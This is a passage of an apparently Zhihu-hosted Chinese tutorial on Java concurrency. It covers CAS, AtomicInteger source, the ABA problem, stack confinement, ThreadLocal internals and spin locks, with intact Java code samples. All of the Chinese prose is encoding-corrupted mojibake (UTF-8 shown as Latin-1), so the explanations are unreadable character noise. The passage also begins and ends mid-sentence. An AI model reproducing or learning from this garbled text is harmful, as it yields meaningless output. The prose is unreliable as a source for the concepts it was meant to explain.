¸å¿ƒæ€è½¬æ¢ã€ç»´æŠ¤é”è®¡æ•°å™¨å’Œæ£€æŸ¥æ˜¯å¦æœ‰è¢«é˜»å¡çš„çº¿ç¨‹éœ€è¦å”¤é†’ç­‰æ“ä½œã€‚</p><h3>1. CAS</h3><p>éšç€ç¡¬ä»¶æŒ‡ä»¤é›†çš„å‘å±•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŸºäºå†²çªæ£€æµ‹çš„ä¹è§‚å¹¶å‘ç­–ç•¥ï¼šå…ˆè¿›è¡Œæ“ä½œï¼Œå¦‚æœæ²¡æœ‰å…¶å®ƒçº¿ç¨‹äº‰ç”¨å…±äº«æ•°æ®ï¼Œé‚£æ“ä½œå°±æˆåŠŸäº†ï¼Œå¦åˆ™é‡‡å–è¡¥å¿æªæ–½ï¼ˆä¸æ–­åœ°é‡è¯•ï¼Œç›´åˆ°æˆåŠŸä¸ºæ­¢ï¼‰ã€‚è¿™ç§ä¹è§‚çš„å¹¶å‘ç­–ç•¥çš„è®¸å¤šå®ç°éƒ½ä¸éœ€è¦å°†çº¿ç¨‹é˜»å¡ï¼Œå› æ­¤è¿™ç§åŒæ­¥æ“ä½œç§°ä¸ºéé˜»å¡åŒæ­¥ã€‚</p><p>ä¹è§‚é”éœ€è¦æ“ä½œå’Œå†²çªæ£€æµ‹è¿™ä¸¤ä¸ªæ­¥éª¤å…·å¤‡åŸå­æ€§ï¼Œè¿™é‡Œå°±ä¸èƒ½å†ä½¿ç”¨äº’æ–¥åŒæ­¥æ¥ä¿è¯äº†ï¼Œåªèƒ½é ç¡¬ä»¶æ¥å®Œæˆã€‚ç¡¬ä»¶æ”¯æŒçš„åŸå­æ€§æ“ä½œæœ€å…¸å‹çš„æ˜¯ï¼šæ¯”è¾ƒå¹¶äº¤æ¢ï¼ˆCompare-and-Swapï¼ŒCASï¼‰ã€‚CAS æŒ‡ä»¤éœ€è¦æœ‰ 3 ä¸ªæ“ä½œæ•°ï¼Œåˆ†åˆ«æ˜¯å†…å­˜åœ°å€ Vã€æ—§çš„é¢„æœŸå€¼ A å’Œæ–°å€¼ Bã€‚å½“æ‰§è¡Œæ“ä½œæ—¶ï¼Œåªæœ‰å½“ V çš„å€¼ç­‰äº Aï¼Œæ‰å°† V çš„å€¼æ›´æ–°ä¸º Bã€‚</p><h3>2. AtomicInteger</h3><p>J.U.C åŒ…é‡Œé¢çš„æ•´æ•°åŸå­ç±» AtomicInteger çš„æ–¹æ³•è°ƒç”¨äº† Unsafe ç±»çš„ CAS æ“ä½œã€‚</p><p>ä»¥ä¸‹ä»£ç ä½¿ç”¨äº† AtomicInteger æ‰§è¡Œäº†è‡ªå¢çš„æ“ä½œã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"n\">AtomicInteger</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">AtomicInteger</span><span class=\"o\">();</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">add</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"n\">cnt</span><span class=\"o\">.</span><span class=\"na\">incrementAndGet</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><p>ä»¥ä¸‹ä»£ç æ˜¯ incrementAndGet() çš„æºç ï¼Œå®ƒè°ƒç”¨äº† Unsafe çš„ getAndAddInt() ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"nf\">incrementAndGet</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">unsafe</span><span class=\"o\">.</span><span class=\"na\">getAndAddInt</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">valueOffset</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">)</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>ä»¥ä¸‹ä»£ç æ˜¯ getAndAddInt() æºç ï¼Œvar1 æŒ‡ç¤ºå¯¹è±¡å†…å­˜åœ°å€ï¼Œvar2 æŒ‡ç¤ºè¯¥å­—æ®µç›¸å¯¹å¯¹è±¡å†…å­˜åœ°å€çš„åç§»ï¼Œvar4 æŒ‡ç¤ºæ“ä½œéœ€è¦åŠ çš„æ•°å€¼ï¼Œè¿™é‡Œä¸º 1ã€‚é€šè¿‡ getIntVolatile(var1, var2) å¾—åˆ°æ—§çš„é¢„æœŸå€¼ï¼Œé€šè¿‡è°ƒç”¨ compareAndSwapInt() æ¥è¿›è¡Œ CAS æ¯”è¾ƒï¼Œå¦‚æœè¯¥å­—æ®µå†…å­˜åœ°å€ä¸­çš„å€¼ç­‰äº var5ï¼Œé‚£ä¹ˆå°±æ›´æ–°å†…å­˜åœ°å€ä¸º var1+var2 çš„å˜é‡ä¸º var5+var4ã€‚</p><p>å¯ä»¥çœ‹åˆ° getAndAddInt() åœ¨ä¸€ä¸ªå¾ªç¯ä¸­è¿›è¡Œï¼Œå‘ç”Ÿå†²çªçš„åšæ³•æ˜¯ä¸æ–­çš„è¿›è¡Œé‡è¯•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"nf\">getAndAddInt</span><span class=\"o\">(</span><span class=\"n\">Object</span> <span class=\"n\">var1</span><span class=\"o\">,</span> <span class=\"kt\">long</span> <span class=\"n\">var2</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">var4</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">var5</span><span class=\"o\">;</span>\n    <span class=\"k\">do</span> <span class=\"o\">{</span>\n        <span class=\"n\">var5</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">getIntVolatile</span><span class=\"o\">(</span><span class=\"n\">var1</span><span class=\"o\">,</span> <span class=\"n\">var2</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span> <span class=\"k\">while</span><span class=\"o\">(!</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">compareAndSwapInt</span><span class=\"o\">(</span><span class=\"n\">var1</span><span class=\"o\">,</span> <span class=\"n\">var2</span><span class=\"o\">,</span> <span class=\"n\">var5</span><span class=\"o\">,</span> <span class=\"n\">var5</span> <span class=\"o\">+</span> <span class=\"n\">var4</span><span class=\"o\">));</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">var5</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>3. ABA</h3><p>å¦‚æœä¸€ä¸ªå˜é‡åˆæ¬¡è¯»å–çš„æ—¶å€™æ˜¯ A å€¼ï¼Œå®ƒçš„å€¼è¢«æ”¹æˆäº† Bï¼Œåæ¥åˆè¢«æ”¹å›ä¸º Aï¼Œé‚£ CAS æ“ä½œå°±ä¼šè¯¯è®¤ä¸ºå®ƒä»æ¥æ²¡æœ‰è¢«æ”¹å˜è¿‡ã€‚</p><p>J.U.C åŒ…æä¾›äº†ä¸€ä¸ªå¸¦æœ‰æ ‡è®°çš„åŸå­å¼•ç”¨ç±» AtomicStampedReference æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå®ƒå¯ä»¥é€šè¿‡æ§åˆ¶å˜é‡å€¼çš„ç‰ˆæœ¬æ¥ä¿è¯ CAS çš„æ­£ç¡®æ€§ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ ABA é—®é¢˜ä¸ä¼šå½±å“ç¨‹åºå¹¶å‘çš„æ­£ç¡®æ€§ï¼Œå¦‚æœéœ€è¦è§£å†³ ABA é—®é¢˜ï¼Œæ”¹ç”¨ä¼ ç»Ÿçš„äº’æ–¥åŒæ­¥å¯èƒ½ä¼šæ¯”åŸå­ç±»æ›´é«˜æ•ˆã€‚</p><h2>æ— åŒæ­¥æ–¹æ¡ˆ</h2><p>è¦ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œå¹¶ä¸æ˜¯ä¸€å®šå°±è¦è¿›è¡ŒåŒæ­¥ã€‚å¦‚æœä¸€ä¸ªæ–¹æ³•æœ¬æ¥å°±ä¸æ¶‰åŠå…±äº«æ•°æ®ï¼Œé‚£å®ƒè‡ªç„¶å°±æ— é¡»ä»»ä½•åŒæ­¥æªæ–½å»ä¿è¯æ­£ç¡®æ€§ã€‚</p><h3>1. æ ˆå°é—­</h3><p>å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªæ–¹æ³•çš„å±€éƒ¨å˜é‡æ—¶ï¼Œä¸ä¼šå‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œå› ä¸ºå±€éƒ¨å˜é‡å­˜å‚¨åœ¨è™šæ‹Ÿæœºæ ˆä¸­ï¼Œå±äºçº¿ç¨‹ç§æœ‰çš„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">StackClosedExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">add100</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">100</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">cnt</span><span class=\"o\">++;</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">cnt</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">StackClosedExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">StackClosedExample</span><span class=\"o\">();</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">add100</span><span class=\"o\">());</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">add100</span><span class=\"o\">());</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdown</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">100</span>\n<span class=\"n\">100</span></code></pre></div><h3>2. çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆThread Local Storageï¼‰</h3><p>å¦‚æœä¸€æ®µä»£ç ä¸­æ‰€éœ€è¦çš„æ•°æ®å¿…é¡»ä¸å…¶ä»–ä»£ç å…±äº«ï¼Œé‚£å°±çœ‹çœ‹è¿™äº›å…±äº«æ•°æ®çš„ä»£ç æ˜¯å¦èƒ½ä¿è¯åœ¨åŒä¸€ä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œã€‚å¦‚æœèƒ½ä¿è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠå…±äº«æ•°æ®çš„å¯è§èŒƒå›´é™åˆ¶åœ¨åŒä¸€ä¸ªçº¿ç¨‹ä¹‹å†…ï¼Œè¿™æ ·ï¼Œæ— é¡»åŒæ­¥ä¹Ÿèƒ½ä¿è¯çº¿ç¨‹ä¹‹é—´ä¸å‡ºç°æ•°æ®äº‰ç”¨çš„é—®é¢˜ã€‚</p><p>ç¬¦åˆè¿™ç§ç‰¹ç‚¹çš„åº”ç”¨å¹¶ä¸å°‘è§ï¼Œå¤§éƒ¨åˆ†ä½¿ç”¨æ¶ˆè´¹é˜Ÿåˆ—çš„æ¶æ„æ¨¡å¼ï¼ˆå¦‚â€œç”Ÿäº§è€…-æ¶ˆè´¹è€…â€æ¨¡å¼ï¼‰éƒ½ä¼šå°†äº§å“çš„æ¶ˆè´¹è¿‡ç¨‹å°½é‡åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­æ¶ˆè´¹å®Œã€‚å…¶ä¸­æœ€é‡è¦çš„ä¸€ä¸ªåº”ç”¨å®ä¾‹å°±æ˜¯ç»å…¸ Web äº¤äº’æ¨¡å‹ä¸­çš„â€œä¸€ä¸ªè¯·æ±‚å¯¹åº”ä¸€ä¸ªæœåŠ¡å™¨çº¿ç¨‹â€ï¼ˆThread-per-Requestï¼‰çš„å¤„ç†æ–¹å¼ï¼Œè¿™ç§å¤„ç†æ–¹å¼çš„å¹¿æ³›åº”ç”¨ä½¿å¾—å¾ˆå¤š Web æœåŠ¡ç«¯åº”ç”¨éƒ½å¯ä»¥ä½¿ç”¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨æ¥è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</p><p>å¯ä»¥ä½¿ç”¨ java.lang.ThreadLocal ç±»æ¥å®ç°çº¿ç¨‹æœ¬åœ°å­˜å‚¨åŠŸèƒ½ã€‚</p><p>å¯¹äºä»¥ä¸‹ä»£ç ï¼Œthread1 ä¸­è®¾ç½® threadLocal ä¸º 1ï¼Œè€Œ thread2 è®¾ç½® threadLocal ä¸º 2ã€‚è¿‡äº†ä¸€æ®µæ—¶é—´ä¹‹åï¼Œthread1 è¯»å– threadLocal ä¾ç„¶æ˜¯ 1ï¼Œä¸å— thread2 çš„å½±å“ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ThreadLocalExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ThreadLocal</span> <span class=\"n\">threadLocal</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ThreadLocal</span><span class=\"o\">();</span>\n        <span class=\"n\">Thread</span> <span class=\"n\">thread1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n            <span class=\"n\">threadLocal</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">);</span>\n            <span class=\"k\">try</span> <span class=\"o\">{</span>\n                <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">sleep</span><span class=\"o\">(</span><span class=\"n\">1000</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">threadLocal</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">());</span>\n            <span class=\"n\">threadLocal</span><span class=\"o\">.</span><span class=\"na\">remove</span><span class=\"o\">();</span>\n        <span class=\"o\">});</span>\n        <span class=\"n\">Thread</span> <span class=\"n\">thread2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n            <span class=\"n\">threadLocal</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">);</span>\n            <span class=\"n\">threadLocal</span><span class=\"o\">.</span><span class=\"na\">remove</span><span class=\"o\">();</span>\n        <span class=\"o\">});</span>\n        <span class=\"n\">thread1</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n        <span class=\"n\">thread2</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">1</span></code></pre></div><p>ä¸ºäº†ç†è§£ ThreadLocalï¼Œå…ˆçœ‹ä»¥ä¸‹ä»£ç ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ThreadLocalExample1</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ThreadLocal</span> <span class=\"n\">threadLocal1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ThreadLocal</span><span class=\"o\">();</span>\n        <span class=\"n\">ThreadLocal</span> <span class=\"n\">threadLocal2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ThreadLocal</span><span class=\"o\">();</span>\n        <span class=\"n\">Thread</span> <span class=\"n\">thread1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n            <span class=\"n\">threadLocal1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">);</span>\n            <span class=\"n\">threadLocal2</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">);</span>\n        <span class=\"o\">});</span>\n        <span class=\"n\">Thread</span> <span class=\"n\">thread2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n            <span class=\"n\">threadLocal1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">);</span>\n            <span class=\"n\">threadLocal2</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">);</span>\n        <span class=\"o\">});</span>\n        <span class=\"n\">thread1</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n        <span class=\"n\">thread2</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>å®ƒæ‰€å¯¹åº”çš„åº•å±‚ç»“æ„å›¾ä¸ºï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-edf9b9cf387e598fbf4f5f70bb7c3c9f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"904\" data-rawheight=\"537\" class=\"origin_image zh-lightbox-thumb\" width=\"904\" data-original=\"https://pic4.zhimg.com/v2-edf9b9cf387e598fbf4f5f70bb7c3c9f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;904&#39; height=&#39;537&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"904\" data-rawheight=\"537\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"904\" data-original=\"https://pic4.zhimg.com/v2-edf9b9cf387e598fbf4f5f70bb7c3c9f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-edf9b9cf387e598fbf4f5f70bb7c3c9f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>æ¯ä¸ª Thread éƒ½æœ‰ä¸€ä¸ª ThreadLocal.ThreadLocalMap å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"cm\">/* ThreadLocal values pertaining to this thread. This map is maintained\n</span><span class=\"cm\"> * by the ThreadLocal class. */</span>\n<span class=\"n\">ThreadLocal</span><span class=\"o\">.</span><span class=\"na\">ThreadLocalMap</span> <span class=\"n\">threadLocals</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span></code></pre></div><p>å½“è°ƒç”¨ä¸€ä¸ª ThreadLocal çš„ set(T value) æ–¹æ³•æ—¶ï¼Œå…ˆå¾—åˆ°å½“å‰çº¿ç¨‹çš„ ThreadLocalMap å¯¹è±¡ï¼Œç„¶åå°† ThreadLocal-&gt;value é”®å€¼å¯¹æ’å…¥åˆ°è¯¥ Map ä¸­ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"n\">T</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">Thread</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">currentThread</span><span class=\"o\">();</span>\n    <span class=\"n\">ThreadLocalMap</span> <span class=\"n\">map</span> <span class=\"o\">=</span> <span class=\"n\">getMap</span><span class=\"o\">(</span><span class=\"n\">t</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">map</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">value</span><span class=\"o\">);</span>\n    <span class=\"k\">else</span>\n        <span class=\"n\">createMap</span><span class=\"o\">(</span><span class=\"n\">t</span><span class=\"o\">,</span> <span class=\"n\">value</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p>get() æ–¹æ³•ç±»ä¼¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">T</span> <span class=\"nf\">get</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"n\">Thread</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">currentThread</span><span class=\"o\">();</span>\n    <span class=\"n\">ThreadLocalMap</span> <span class=\"n\">map</span> <span class=\"o\">=</span> <span class=\"n\">getMap</span><span class=\"o\">(</span><span class=\"n\">t</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">map</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ThreadLocalMap</span><span class=\"o\">.</span><span class=\"na\">Entry</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">getEntry</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">e</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"nd\">@SuppressWarnings</span><span class=\"o\">(</span><span class=\"s\">&#34;unchecked&#34;</span><span class=\"o\">)</span>\n            <span class=\"n\">T</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">T</span><span class=\"o\">)</span><span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">value</span><span class=\"o\">;</span>\n            <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">setInitialValue</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><p>ThreadLocal ä»ç†è®ºä¸Šè®²å¹¶ä¸æ˜¯ç”¨æ¥è§£å†³å¤šçº¿ç¨‹å¹¶å‘é—®é¢˜çš„ï¼Œå› ä¸ºæ ¹æœ¬ä¸å­˜åœ¨å¤šçº¿ç¨‹ç«äº‰ã€‚</p><p>åœ¨ä¸€äº›åœºæ™¯ (å°¤å…¶æ˜¯ä½¿ç”¨çº¿ç¨‹æ± ) ä¸‹ï¼Œç”±äº ThreadLocal.ThreadLocalMap çš„åº•å±‚æ•°æ®ç»“æ„å¯¼è‡´ ThreadLocal æœ‰å†…å­˜æ³„æ¼çš„æƒ…å†µï¼Œåº”è¯¥å°½å¯èƒ½åœ¨æ¯æ¬¡ä½¿ç”¨ ThreadLocal åæ‰‹åŠ¨è°ƒç”¨ remove()ï¼Œä»¥é¿å…å‡ºç° ThreadLocal ç»å…¸çš„å†…å­˜æ³„æ¼ç”šè‡³æ˜¯é€ æˆè‡ªèº«ä¸šåŠ¡æ··ä¹±çš„é£é™©ã€‚</p><h3>3. å¯é‡å…¥ä»£ç ï¼ˆReentrant Codeï¼‰</h3><p>è¿™ç§ä»£ç ä¹Ÿå«åšçº¯ä»£ç ï¼ˆPure Codeï¼‰ï¼Œå¯ä»¥åœ¨ä»£ç æ‰§è¡Œçš„ä»»ä½•æ—¶åˆ»ä¸­æ–­å®ƒï¼Œè½¬è€Œå»æ‰§è¡Œå¦å¤–ä¸€æ®µä»£ç ï¼ˆåŒ…æ‹¬é€’å½’è°ƒç”¨å®ƒæœ¬èº«ï¼‰ï¼Œè€Œåœ¨æ§åˆ¶æƒè¿”å›åï¼ŒåŸæ¥çš„ç¨‹åºä¸ä¼šå‡ºç°ä»»ä½•é”™è¯¯ã€‚</p><p>å¯é‡å…¥ä»£ç æœ‰ä¸€äº›å…±åŒçš„ç‰¹å¾ï¼Œä¾‹å¦‚ä¸ä¾èµ–å­˜å‚¨åœ¨å †ä¸Šçš„æ•°æ®å’Œå…¬ç”¨çš„ç³»ç»Ÿèµ„æºã€ç”¨åˆ°çš„çŠ¶æ€é‡éƒ½ç”±å‚æ•°ä¸­ä¼ å…¥ã€ä¸è°ƒç”¨éå¯é‡å…¥çš„æ–¹æ³•ç­‰ã€‚</p><h2>åäºŒã€é”ä¼˜åŒ–</h2><p>è¿™é‡Œçš„é”ä¼˜åŒ–ä¸»è¦æ˜¯æŒ‡ JVM å¯¹ synchronized çš„ä¼˜åŒ–ã€‚</p><h2>è‡ªæ—‹é”</h2><p>äº’æ–¥åŒæ­¥è¿›å…¥é˜»å¡çŠ¶æ€çš„å¼€é”€éƒ½å¾ˆå¤§ï¼Œåº”è¯¥å°½é‡é¿å…ã€‚åœ¨è®¸å¤šåº”ç”¨ä¸­ï¼Œå…±äº«æ•°æ®çš„é”å®šçŠ¶æ€åªä¼šæŒç»­å¾ˆçŸ­çš„ä¸€æ®µæ—¶é—´ã€‚è‡ªæ—‹é”çš„æ€æƒ³æ˜¯è®©ä¸€ä¸ªçº¿ç¨‹åœ¨è¯·æ±‚ä¸€ä¸ªå…±äº«æ•°æ®çš„é”æ—¶æ‰§è¡Œå¿™å¾ªç¯ï¼ˆè‡ªæ—‹ï¼‰ä¸€æ®µæ—¶é—´ï¼Œå¦‚æœåœ¨è¿™æ®µæ—¶é—´å†…èƒ½è·å¾—é”ï¼Œå°±å¯ä»¥é¿å…è¿›å…¥é˜»å¡çŠ¶æ€ã€‚</p><p>è‡ªæ—‹é”è™½ç„¶èƒ½é¿å…è¿›å…¥é˜»å¡çŠ¶æ€ä»è€Œå‡å°‘å¼€é”€ï¼Œä½†æ˜¯å®ƒéœ€è¦è¿›è¡Œå¿™å¾ªç¯æ“ä½œå ç”¨ CPU æ—¶é—´ï¼Œå®ƒåªé€‚ç”¨äºå…±äº«æ•°æ®çš„é”å®šçŠ¶æ€å¾ˆçŸ­çš„åœºæ™¯ã€‚</p><p>åœ¨ JDK 1.6 